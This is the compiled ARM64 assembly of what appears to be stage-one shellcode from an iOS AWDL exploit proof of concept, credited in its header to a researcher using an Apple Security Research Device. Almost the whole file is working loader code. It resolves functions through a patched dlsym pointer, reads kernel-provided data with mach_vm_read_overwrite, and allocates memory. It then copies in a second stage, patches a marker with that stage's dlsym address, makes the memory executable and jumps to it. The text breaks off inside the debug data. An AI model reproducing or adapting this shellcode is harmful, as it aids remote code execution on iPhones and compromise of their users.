;xcrun -sdk iphoneos clang -g -O2  -mios-version-min=14.3 -DDEBUG=0  -Wall -Wpedantic -Wno-gnu -Werror -Wunused-variable -o z.out stage1.s
; Hand Rolled by David Hoyt | SRD0009 | @h02332 for Apple Security Research Device on Wednesday June 14, 2021
; EDIT - This is an example.. you should recognize Code :-)
; Your Mileage May Vary
	;
	;
	.section	__TEXT,__text,regular,pure_instructions
	.build_version ios, 15, 0	sdk_version 15, 0
	.file	1 "/Users/xss/Downloads/awdl_exploit_release/shellcode" "poc-stage1.s"
	.file	2 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/_types" "_uint64_t.h"
	.file	3 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/_types" "_uint8_t.h"
	.file	4 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/os" "log.h"
	.file	5 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include" "asl.h"
	.file	6 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/mach/arm" "kern_return.h"
	.file	7 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/arm" "_types.h"
	.file	8 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/sys" "_types.h"
	.file	9 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/sys/_types" "_mach_port_t.h"
	.file	10 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/mach" "vm_types.h"
	.file	11 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/mach/arm" "vm_types.h"
	.file	12 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/mach" "port.h"
	.file	13 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/sys/_types" "_size_t.h"
	.file	14 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/mach/arm" "boolean.h"
	.file	15 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/mach" "vm_prot.h"
	.file	16 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/_types" "_uint32_t.h"
	.globl	_start                          ; -- Begin function start
	.p2align	4
_start:                                 ; @start
Lfunc_begin0:
	.loc	1 106 0                         ; poc-stage1.s:106:0
	.cfi_startproc
; %bb.0:
	stp	x28, x27, [sp, #-32]!           ; 16-byte Folded Spill
	stp	x29, x30, [sp, #16]             ; 16-byte Folded Spill
	sub	sp, sp, #976                    ; =976
	.cfi_def_cfa_offset 1008
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	.cfi_offset w27, -24
	.cfi_offset w28, -32
	str	w0, [sp, #972]
	str	x1, [sp, #960]
	str	x2, [sp, #952]
Ltmp0:
	.loc	1 0 0 prologue_end              ; poc-stage1.s:0:0
	adrp	x8, __dlsym@PAGE
	str	x8, [sp, #64]                   ; 8-byte Folded Spill
	.loc	1 107 5                         ; poc-stage1.s:107:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	mov	x0, #-2
	str	x0, [sp, #72]                   ; 8-byte Folded Spill
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str@PAGE
	add	x1, x1, l_.str@PAGEOFF
	str	x1, [sp, #40]                   ; 8-byte Folded Spill
	.loc	1 107 5                         ; poc-stage1.s:107:5
	blr	x8
	mov	x8, x0
	mov	x1, #0
	str	x1, [sp, #48]                   ; 8-byte Folded Spill
	mov	x0, x1
	mov	w2, #3
	str	w2, [sp, #60]                   ; 4-byte Folded Spill
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x3, l_.str.1@PAGE
	add	x3, x3, l_.str.1@PAGEOFF
	.loc	1 107 5                         ; poc-stage1.s:107:5
	blr	x8
	ldr	x8, [sp, #64]                   ; 8-byte Folded Reload
	ldr	x0, [sp, #72]                   ; 8-byte Folded Reload
	.loc	1 112 5 is_stmt 1               ; poc-stage1.s:112:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.2@PAGE
	add	x1, x1, l_.str.2@PAGEOFF
	.loc	1 112 5                         ; poc-stage1.s:112:5
	blr	x8
	mov	x8, x0
	ldr	w0, [sp, #972]
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x9, _kdata@PAGE
	.loc	1 112 5                         ; poc-stage1.s:112:5
	ldr	x1, [x9, _kdata@PAGEOFF]
	add	x3, sp, #136                    ; =136
	mov	x2, #816
	add	x4, sp, #128                    ; =128
	blr	x8
	ldr	x1, [sp, #40]                   ; 8-byte Folded Reload
	ldr	x8, [sp, #64]                   ; 8-byte Folded Reload
	ldr	x0, [sp, #72]                   ; 8-byte Folded Reload
	.loc	1 114 5 is_stmt 1               ; poc-stage1.s:114:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	blr	x8
	ldr	x1, [sp, #48]                   ; 8-byte Folded Reload
	ldr	w2, [sp, #60]                   ; 4-byte Folded Reload
	mov	x8, x0
	mov	x0, x1
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x3, l_.str.3@PAGE
	add	x3, x3, l_.str.3@PAGEOFF
	.loc	1 114 5                         ; poc-stage1.s:114:5
	blr	x8
	ldr	x8, [sp, #64]                   ; 8-byte Folded Reload
	ldr	x0, [sp, #72]                   ; 8-byte Folded Reload
	.loc	1 117 30 is_stmt 1              ; poc-stage1.s:117:30
	ldr	w9, [sp, #148]
	.loc	1 117 46 is_stmt 0              ; poc-stage1.s:117:46
	lsl	w9, w9, #10
	.loc	1 117 14                        ; poc-stage1.s:117:14
	str	w9, [sp, #124]
	.loc	1 120 16 is_stmt 1              ; poc-stage1.s:120:16
	ldr	w9, [sp, #124]
	mov	w10, #16383
	add	w9, w9, w10
	str	w9, [sp, #124]
	.loc	1 121 16                        ; poc-stage1.s:121:16
	ldr	w9, [sp, #124]
	and	w9, w9, #0xffffc000
	str	w9, [sp, #124]
	.loc	1 125 24                        ; poc-stage1.s:125:24
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.4@PAGE
	add	x1, x1, l_.str.4@PAGEOFF
	.loc	1 125 24                        ; poc-stage1.s:125:24
	blr	x8
	blr	x0
	ldr	x8, [sp, #64]                   ; 8-byte Folded Reload
	mov	x9, x0
	ldr	x0, [sp, #72]                   ; 8-byte Folded Reload
	.loc	1 125 17                        ; poc-stage1.s:125:17
	str	w9, [sp, #108]
	.loc	1 126 5 is_stmt 1               ; poc-stage1.s:126:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.5@PAGE
	add	x1, x1, l_.str.5@PAGEOFF
	.loc	1 126 5                         ; poc-stage1.s:126:5
	blr	x8
	mov	x8, x0
	ldr	w0, [sp, #108]
	ldr	w9, [sp, #124]
	mov	x2, x9
	add	x1, sp, #112                    ; =112
	mov	w3, #1
	blr	x8
Ltmp1:
	.loc	1 129 19 is_stmt 1              ; poc-stage1.s:129:19
	str	wzr, [sp, #104]
LBB0_1:                                 ; =>This Inner Loop Header: Depth=1
Ltmp2:
	.loc	1 129 26 is_stmt 0              ; poc-stage1.s:129:26
	ldr	w8, [sp, #104]
	.loc	1 129 33                        ; poc-stage1.s:129:33
	ldr	w9, [sp, #148]
Ltmp3:
	.loc	1 129 5                         ; poc-stage1.s:129:5
	subs	w8, w8, w9
	b.hs	LBB0_4
Ltmp4:
; %bb.2:                                ;   in Loop: Header=BB0_1 Depth=1
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x8, __dlsym@PAGE
Ltmp5:
	.loc	1 130 9 is_stmt 1               ; poc-stage1.s:130:9
	ldr	x8, [x8, __dlsym@PAGEOFF]
	mov	x0, #-2
Ltmp6:
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.2@PAGE
	add	x1, x1, l_.str.2@PAGEOFF
Ltmp7:
	.loc	1 130 9                         ; poc-stage1.s:130:9
	blr	x8
	mov	x8, x0
	ldr	w0, [sp, #972]
	add	x9, sp, #136                    ; =136
	add	x9, x9, #16                     ; =16
	ldr	w10, [sp, #104]
                                        ; kill: def $x10 killed $w10
	ldr	x1, [x9, x10, lsl #3]
	ldr	x9, [sp, #112]
	ldr	w10, [sp, #104]
	lsl	w10, w10, #10
                                        ; kill: def $x10 killed $w10
	add	x3, x9, x10
	mov	x2, #1024
	add	x4, sp, #128                    ; =128
	blr	x8
Ltmp8:
; %bb.3:                                ;   in Loop: Header=BB0_1 Depth=1
	.loc	1 129 52 is_stmt 1              ; poc-stage1.s:129:52
	ldr	w8, [sp, #104]
	add	w8, w8, #1                      ; =1
	str	w8, [sp, #104]
	.loc	1 129 5 is_stmt 0               ; poc-stage1.s:129:5
	b	LBB0_1
Ltmp9:
LBB0_4:
	.loc	1 0 5                           ; poc-stage1.s:0:5
	add	x8, sp, #96                     ; =96
	str	x8, [sp, #16]                   ; 8-byte Folded Spill
	mov	x8, #48879
	movk	x8, #57005, lsl #16
	movk	x8, #48879, lsl #32
	movk	x8, #57005, lsl #48
	.loc	1 134 14 is_stmt 1              ; poc-stage1.s:134:14
	str	x8, [sp, #96]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x8, __dlsym@PAGE
	str	x8, [sp, #24]                   ; 8-byte Folded Spill
	.loc	1 135 44 is_stmt 1              ; poc-stage1.s:135:44
	ldr	x8, [x8, __dlsym@PAGEOFF]
	mov	x0, #-2
	str	x0, [sp, #32]                   ; 8-byte Folded Spill
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.6@PAGE
	add	x1, x1, l_.str.6@PAGEOFF
	.loc	1 135 44                        ; poc-stage1.s:135:44
	blr	x8
	ldr	x2, [sp, #16]                   ; 8-byte Folded Reload
	mov	x8, x0
	ldr	x0, [sp, #112]
	ldr	w9, [sp, #124]
	mov	x1, x9
	mov	x3, #8
	blr	x8
	ldr	x8, [sp, #24]                   ; 8-byte Folded Reload
	mov	x9, x0
	ldr	x0, [sp, #32]                   ; 8-byte Folded Reload
	.loc	1 135 24                        ; poc-stage1.s:135:24
	str	x9, [sp, #88]
	.loc	1 136 5 is_stmt 1               ; poc-stage1.s:136:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str@PAGE
	add	x1, x1, l_.str@PAGEOFF
	.loc	1 136 5                         ; poc-stage1.s:136:5
	blr	x8
	mov	x8, x0
	ldr	x9, [sp, #88]
	mov	x1, #0
	mov	x0, x1
	mov	w2, #3
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x3, l_.str.7@PAGE
	add	x3, x3, l_.str.7@PAGEOFF
	.loc	1 136 5                         ; poc-stage1.s:136:5
	mov	x10, sp
	str	x9, [x10]
	blr	x8
	ldr	x8, [sp, #24]                   ; 8-byte Folded Reload
	ldr	x0, [sp, #32]                   ; 8-byte Folded Reload
	.loc	1 137 26 is_stmt 1              ; poc-stage1.s:137:26
	ldr	x9, [x8, __dlsym@PAGEOFF]
	.loc	1 137 6 is_stmt 0               ; poc-stage1.s:137:6
	ldr	x10, [sp, #88]
	.loc	1 137 24                        ; poc-stage1.s:137:24
	str	x9, [x10]
	.loc	1 140 5 is_stmt 1               ; poc-stage1.s:140:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.8@PAGE
	add	x1, x1, l_.str.8@PAGEOFF
	.loc	1 140 5                         ; poc-stage1.s:140:5
	blr	x8
	mov	x8, x0
	ldr	w0, [sp, #108]
	ldr	x1, [sp, #112]
	ldr	w9, [sp, #124]
	mov	x2, x9
	mov	w3, #0
	mov	w4, #5
	blr	x8
	.loc	1 143 42 is_stmt 1              ; poc-stage1.s:143:42
	ldr	x8, [sp, #112]
	.loc	1 143 12 is_stmt 0              ; poc-stage1.s:143:12
	str	x8, [sp, #80]
	.loc	1 144 5 is_stmt 1               ; poc-stage1.s:144:5
	ldr	x8, [sp, #80]
	.loc	1 144 12 is_stmt 0              ; poc-stage1.s:144:12
	ldr	w0, [sp, #972]
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x9, _kdata@PAGE
	.loc	1 144 18                        ; poc-stage1.s:144:18
	ldr	x1, [x9, _kdata@PAGEOFF]
	.loc	1 144 5                         ; poc-stage1.s:144:5
	blr	x8
	.loc	1 145 1 is_stmt 1               ; poc-stage1.s:145:1
	add	sp, sp, #976                    ; =976
	ldp	x29, x30, [sp, #16]             ; 16-byte Folded Reload
	ldp	x28, x27, [sp], #32             ; 16-byte Folded Reload
	ret
Ltmp10:
Lfunc_end0:
	.cfi_endproc
                                        ; -- End function
	.globl	_main                           ; -- Begin function main
	.p2align	2
_main:                                  ; @main
Lfunc_begin1:
	.loc	1 150 0                         ; poc-stage1.s:150:0
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #304                    ; =304
	stp	x28, x27, [sp, #272]            ; 16-byte Folded Spill
	stp	x29, x30, [sp, #288]            ; 16-byte Folded Spill
	.cfi_def_cfa_offset 304
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	.cfi_offset w27, -24
	.cfi_offset w28, -32
Ltmp11:
	.loc	1 0 0 prologue_end              ; poc-stage1.s:0:0
	adrp	x8, __os_log_default@GOTPAGE
	ldr	x8, [x8, __os_log_default@GOTPAGEOFF]
	str	x8, [sp, #112]                  ; 8-byte Folded Spill
Ltmp12:
	adrp	x9, ___dso_handle@GOTPAGE
	ldr	x9, [x9, ___dso_handle@GOTPAGEOFF]
	str	x9, [sp, #120]                  ; 8-byte Folded Spill
	adrp	x9, ___stack_chk_guard@GOTPAGE
	ldr	x9, [x9, ___stack_chk_guard@GOTPAGEOFF]
	ldr	x9, [x9]
	str	x9, [sp, #264]
	str	wzr, [sp, #236]
	str	w0, [sp, #232]
	str	x1, [sp, #224]
Ltmp13:
	.loc	1 153 10                        ; poc-stage1.s:153:10
	str	x8, [sp, #208]
	strb	wzr, [sp, #207]
Ltmp14:
	.loc	1 153 10 is_stmt 0              ; poc-stage1.s:153:10
	ldr	x0, [sp, #208]
	ldrb	w1, [sp, #207]
	bl	_os_log_type_enabled
Ltmp15:
	.loc	1 153 10                        ; poc-stage1.s:153:10
	tbz	w0, #0, LBB1_2
; %bb.1:
Ltmp16:
	.loc	1 153 10                        ; poc-stage1.s:153:10
	ldr	x8, [sp, #208]
	str	x8, [sp, #88]                   ; 8-byte Folded Spill
	ldrb	w8, [sp, #207]
	str	w8, [sp, #100]                  ; 4-byte Folded Spill
	add	x0, sp, #192                    ; =192
	str	x0, [sp, #104]                  ; 8-byte Folded Spill
	bl	___os_log_helper_16_0_0
	ldr	x0, [sp, #120]                  ; 8-byte Folded Reload
	ldr	x1, [sp, #88]                   ; 8-byte Folded Reload
	ldr	w2, [sp, #100]                  ; 4-byte Folded Reload
	ldr	x4, [sp, #104]                  ; 8-byte Folded Reload
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x3, LOS_LOG0@PAGE
	add	x3, x3, LOS_LOG0@PAGEOFF
	mov	w5, #2
	.loc	1 153 10                        ; poc-stage1.s:153:10
	bl	__os_log_impl
Ltmp17:
LBB1_2:
	.loc	1 0 10                          ; poc-stage1.s:0:10
	ldr	x8, [sp, #112]                  ; 8-byte Folded Reload
Ltmp18:
	.loc	1 154 10 is_stmt 1              ; poc-stage1.s:154:10
	str	x8, [sp, #184]
	mov	w8, #1
	strb	w8, [sp, #183]
Ltmp19:
	.loc	1 154 10 is_stmt 0              ; poc-stage1.s:154:10
	ldr	x0, [sp, #184]
	ldrb	w1, [sp, #183]
	bl	_os_log_type_enabled
Ltmp20:
	.loc	1 154 10                        ; poc-stage1.s:154:10
	tbz	w0, #0, LBB1_4
; %bb.3:
Ltmp21:
	.loc	1 154 10                        ; poc-stage1.s:154:10
	ldr	x8, [sp, #184]
	str	x8, [sp, #64]                   ; 8-byte Folded Spill
	ldrb	w8, [sp, #183]
	str	w8, [sp, #76]                   ; 4-byte Folded Spill
	add	x0, sp, #176                    ; =176
	str	x0, [sp, #80]                   ; 8-byte Folded Spill
	bl	___os_log_helper_16_0_0
	ldr	x0, [sp, #120]                  ; 8-byte Folded Reload
	ldr	x1, [sp, #64]                   ; 8-byte Folded Reload
	ldr	w2, [sp, #76]                   ; 4-byte Folded Reload
	ldr	x4, [sp, #80]                   ; 8-byte Folded Reload
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x3, LOS_LOG1@PAGE
	add	x3, x3, LOS_LOG1@PAGEOFF
	mov	w5, #2
	.loc	1 154 10                        ; poc-stage1.s:154:10
	bl	__os_log_impl
Ltmp22:
LBB1_4:
	.loc	1 0 10                          ; poc-stage1.s:0:10
	ldr	x8, [sp, #112]                  ; 8-byte Folded Reload
Ltmp23:
	.loc	1 155 10 is_stmt 1              ; poc-stage1.s:155:10
	str	x8, [sp, #168]
	mov	w8, #2
	strb	w8, [sp, #167]
Ltmp24:
	.loc	1 155 10 is_stmt 0              ; poc-stage1.s:155:10
	ldr	x0, [sp, #168]
	ldrb	w1, [sp, #167]
	bl	_os_log_type_enabled
Ltmp25:
	.loc	1 155 10                        ; poc-stage1.s:155:10
	tbz	w0, #0, LBB1_6
; %bb.5:
Ltmp26:
	.loc	1 155 10                        ; poc-stage1.s:155:10
	ldr	x8, [sp, #168]
	str	x8, [sp, #40]                   ; 8-byte Folded Spill
	ldrb	w8, [sp, #167]
	str	w8, [sp, #52]                   ; 4-byte Folded Spill
	add	x0, sp, #160                    ; =160
	str	x0, [sp, #56]                   ; 8-byte Folded Spill
	bl	___os_log_helper_16_0_0
	ldr	x0, [sp, #120]                  ; 8-byte Folded Reload
	ldr	x1, [sp, #40]                   ; 8-byte Folded Reload
	ldr	w2, [sp, #52]                   ; 4-byte Folded Reload
	ldr	x4, [sp, #56]                   ; 8-byte Folded Reload
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x3, LOS_LOG2@PAGE
	add	x3, x3, LOS_LOG2@PAGEOFF
	mov	w5, #2
	.loc	1 155 10                        ; poc-stage1.s:155:10
	bl	__os_log_debug_impl
Ltmp27:
LBB1_6:
	.loc	1 157 40 is_stmt 1              ; poc-stage1.s:157:40
	ldr	w0, [sp, #220]
	.loc	1 157 31 is_stmt 0              ; poc-stage1.s:157:31
	bl	_getpwuid
	.loc	1 157 25                        ; poc-stage1.s:157:25
	str	x0, [sp, #152]
Ltmp28:
	.loc	1 158 14 is_stmt 1              ; poc-stage1.s:158:14
	ldr	x8, [sp, #152]
Ltmp29:
	.loc	1 158 14 is_stmt 0              ; poc-stage1.s:158:14
	cbnz	x8, LBB1_10
; %bb.7:
Ltmp30:
	.loc	1 160 24 is_stmt 1              ; poc-stage1.s:160:24
	bl	___error
	ldr	x8, [sp, #112]                  ; 8-byte Folded Reload
	ldr	w9, [x0]
	.loc	1 160 18 is_stmt 0              ; poc-stage1.s:160:18
	str	w9, [sp, #148]
Ltmp31:
	.loc	1 161 14 is_stmt 1              ; poc-stage1.s:161:14
	str	x8, [sp, #136]
	mov	w8, #16
	strb	w8, [sp, #135]
Ltmp32:
	.loc	1 161 14 is_stmt 0              ; poc-stage1.s:161:14
	ldr	x0, [sp, #136]
	ldrb	w1, [sp, #135]
	bl	_os_log_type_enabled
Ltmp33:
	.loc	1 161 14                        ; poc-stage1.s:161:14
	tbz	w0, #0, LBB1_9
; %bb.8:
Ltmp34:
	.loc	1 161 14                        ; poc-stage1.s:161:14
	ldr	x8, [sp, #136]
	str	x8, [sp, #16]                   ; 8-byte Folded Spill
	ldrb	w8, [sp, #135]
	str	w8, [sp, #28]                   ; 4-byte Folded Spill
	ldr	w1, [sp, #220]
	ldr	w2, [sp, #148]
	add	x0, sp, #240                    ; =240
	str	x0, [sp, #32]                   ; 8-byte Folded Spill
	bl	___os_log_helper_16_0_2_4_0_4_0
	ldr	x0, [sp, #120]                  ; 8-byte Folded Reload
	ldr	x1, [sp, #16]                   ; 8-byte Folded Reload
	ldr	w2, [sp, #28]                   ; 4-byte Folded Reload
	ldr	x4, [sp, #32]                   ; 8-byte Folded Reload
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x3, LOS_LOG3@PAGE
	add	x3, x3, LOS_LOG3@PAGEOFF
	mov	w5, #14
	.loc	1 161 14                        ; poc-stage1.s:161:14
	bl	__os_log_error_impl
Ltmp35:
LBB1_9:
	.loc	1 163 21 is_stmt 1              ; poc-stage1.s:163:21
	ldr	w8, [sp, #148]
	.loc	1 163 14 is_stmt 0              ; poc-stage1.s:163:14
	str	w8, [sp, #236]
	b	LBB1_11
Ltmp36:
LBB1_10:
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x8, __dlsym@PAGE
	.loc	1 166 5 is_stmt 1               ; poc-stage1.s:166:5
	ldr	x8, [x8, __dlsym@PAGEOFF]
	mov	x0, #-2
	.loc	1 0 0 is_stmt 0                 ; poc-stage1.s:0:0
	adrp	x1, l_.str.9@PAGE
	add	x1, x1, l_.str.9@PAGEOFF
	.loc	1 166 5                         ; poc-stage1.s:166:5
	blr	x8
	mov	x8, x0
	.loc	1 0 0                           ; poc-stage1.s:0:0
	adrp	x0, l_.str.10@PAGE
	add	x0, x0, l_.str.10@PAGEOFF
	.loc	1 166 5                         ; poc-stage1.s:166:5
	blr	x8
	mov	w0, #0
	mov	x2, #0
	.loc	1 167 5 is_stmt 1               ; poc-stage1.s:167:5
	mov	x1, x2
	bl	_start
	mov	w8, #42
	.loc	1 168 5                         ; poc-stage1.s:168:5
	str	w8, [sp, #236]
Ltmp37:
LBB1_11:
	.loc	1 170 6                         ; poc-stage1.s:170:6
	ldr	w8, [sp, #236]
	str	w8, [sp, #12]                   ; 4-byte Folded Spill
	adrp	x8, ___stack_chk_guard@GOTPAGE
	ldr	x8, [x8, ___stack_chk_guard@GOTPAGEOFF]
	ldr	x8, [x8]
	ldr	x9, [sp, #264]
	subs	x8, x8, x9
	b.ne	LBB1_13
; %bb.12:
	.loc	1 0 6 is_stmt 0                 ; poc-stage1.s:0:6
	ldr	w0, [sp, #12]                   ; 4-byte Folded Reload
	.loc	1 170 6                         ; poc-stage1.s:170:6
	ldp	x29, x30, [sp, #288]            ; 16-byte Folded Reload
	ldp	x28, x27, [sp, #272]            ; 16-byte Folded Reload
	add	sp, sp, #304                    ; =304
	ret
LBB1_13:
	.loc	1 0 0                           ; poc-stage1.s:0:0
	bl	___stack_chk_fail
Ltmp38:
Lfunc_end1:
	.cfi_endproc
                                        ; -- End function
	.private_extern	___os_log_helper_16_0_0 ; -- Begin function __os_log_helper_16_0_0
	.globl	___os_log_helper_16_0_0
	.weak_definition	___os_log_helper_16_0_0
	.p2align	2
___os_log_helper_16_0_0:                ; @__os_log_helper_16_0_0
Lfunc_begin2:
	.loc	1 0 0 is_stmt 1                 ; poc-stage1.s:0:0
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #16                     ; =16
	.cfi_def_cfa_offset 16
	str	x0, [sp, #8]
Ltmp40:
	ldr	x8, [sp, #8]
	strb	wzr, [x8]
	strb	wzr, [x8, #1]
	add	sp, sp, #16                     ; =16
	ret
Ltmp41:
Lfunc_end2:
	.cfi_endproc
                                        ; -- End function
	.private_extern	___os_log_helper_16_0_2_4_0_4_0 ; -- Begin function __os_log_helper_16_0_2_4_0_4_0
	.globl	___os_log_helper_16_0_2_4_0_4_0
	.weak_definition	___os_log_helper_16_0_2_4_0_4_0
	.p2align	2
___os_log_helper_16_0_2_4_0_4_0:        ; @__os_log_helper_16_0_2_4_0_4_0
Lfunc_begin3:
	.loc	1 0 0                           ; poc-stage1.s:0:0
	.cfi_startproc
; %bb.0:
	sub	sp, sp, #16                     ; =16
	.cfi_def_cfa_offset 16
	str	x0, [sp, #8]
	str	w1, [sp, #4]
	str	w2, [sp]
Ltmp43:
	ldr	x9, [sp, #8]
	strb	wzr, [x9]
	mov	w8, #2
	strb	w8, [x9, #1]
	strb	wzr, [x9, #2]
	mov	w8, #4
	strb	w8, [x9, #3]
	ldr	w10, [sp, #4]
	str	w10, [x9, #4]
	strb	wzr, [x9, #8]
	strb	w8, [x9, #9]
	ldr	w8, [sp]
	stur	w8, [x9, #10]
	add	sp, sp, #16                     ; =16
	ret
Ltmp44:
Lfunc_end3:
	.cfi_endproc
                                        ; -- End function
	.globl	__dlsym                         ; @_dlsym
	.p2align	3
__dlsym:
	.quad	-2401053088876216593

	.globl	_kdata                          ; @kdata
	.p2align	3
_kdata:
	.quad	4774451407313060418             ; 0x4242424242424242

	.section	__TEXT,__cstring,cstring_literals
l_.str:                                 ; @.str
	.asciz	"asl_log"

l_.str.1:                               ; @.str.1
	.asciz	"hello from stage1!"

l_.str.2:                               ; @.str.2
	.asciz	"mach_vm_read_overwrite"

l_.str.3:                               ; @.str.3
	.asciz	"stage1 read kconf"

l_.str.4:                               ; @.str.4
	.asciz	"task_self_trap"

l_.str.5:                               ; @.str.5
	.asciz	"mach_vm_allocate"

l_.str.6:                               ; @.str.6
	.asciz	"memmem"

l_.str.7:                               ; @.str.7
	.asciz	"stage2_dlsym_addr: %016llx"

l_.str.8:                               ; @.str.8
	.asciz	"mach_vm_protect"

	.section	__TEXT,__oslogstring,cstring_literals
LOS_LOG0:                               ; @"\01LOS_LOG0"
	.asciz	"Standard log message."

LOS_LOG1:                               ; @"\01LOS_LOG1"
	.asciz	"Additional info for troubleshooting."

LOS_LOG2:                               ; @"\01LOS_LOG2"
	.asciz	"Debug level messages."

LOS_LOG3:                               ; @"\01LOS_LOG3"
	.asciz	"failed to lookup user %d: %{darwin.errno}d"

	.section	__TEXT,__cstring,cstring_literals
l_.str.9:                               ; @.str.9
	.asciz	"printf"

l_.str.10:                              ; @.str.10
	.asciz	"%s %d hello - start\n"

	.file	17 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/sys/_types" "_uid_t.h"
	.file	18 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include" "pwd.h"
	.file	19 "/Applications/Xcode-beta.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS15.0.sdk/usr/include/sys/_types" "_gid_t.h"
	.section	__DWARF,__debug_abbrev,regular,debug
Lsection_abbrev:
	.byte	1                               ; Abbreviation Code
	.byte	17                              ; DW_TAG_compile_unit
	.byte	1                               ; DW_CHILDREN_yes
	.byte	37                              ; DW_AT_producer
	.byte	14                              ; DW_FORM_strp
	.byte	19                              ; DW_AT_language
	.byte	5                               ; DW_FORM_data2
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.ascii	"\202|"                         ; DW_AT_LLVM_sysroot
	.byte	14                              ; DW_FORM_strp
	.ascii	"\357\177"                      ; DW_AT_APPLE_sdk
	.byte	14                              ; DW_FORM_strp
	.byte	16                              ; DW_AT_stmt_list
	.byte	23                              ; DW_FORM_sec_offset
	.byte	27                              ; DW_AT_comp_dir
	.byte	14                              ; DW_FORM_strp
	.byte	17                              ; DW_AT_low_pc
	.byte	1                               ; DW_FORM_addr
	.byte	18                              ; DW_AT_high_pc
	.byte	6                               ; DW_FORM_data4
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	2                               ; Abbreviation Code
	.byte	52                              ; DW_TAG_variable
	.byte	0                               ; DW_CHILDREN_no
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	63                              ; DW_AT_external
	.byte	25                              ; DW_FORM_flag_present
	.byte	58                              ; DW_AT_decl_file
	.byte	11                              ; DW_FORM_data1
	.byte	59                              ; DW_AT_decl_line
	.byte	11                              ; DW_FORM_data1
	.byte	2                               ; DW_AT_location
	.byte	24                              ; DW_FORM_exprloc
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	3                               ; Abbreviation Code
	.byte	15                              ; DW_TAG_pointer_type
	.byte	0                               ; DW_CHILDREN_no
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	4                               ; Abbreviation Code
	.byte	21                              ; DW_TAG_subroutine_type
	.byte	1                               ; DW_CHILDREN_yes
	.byte	73                              ; DW_AT_type
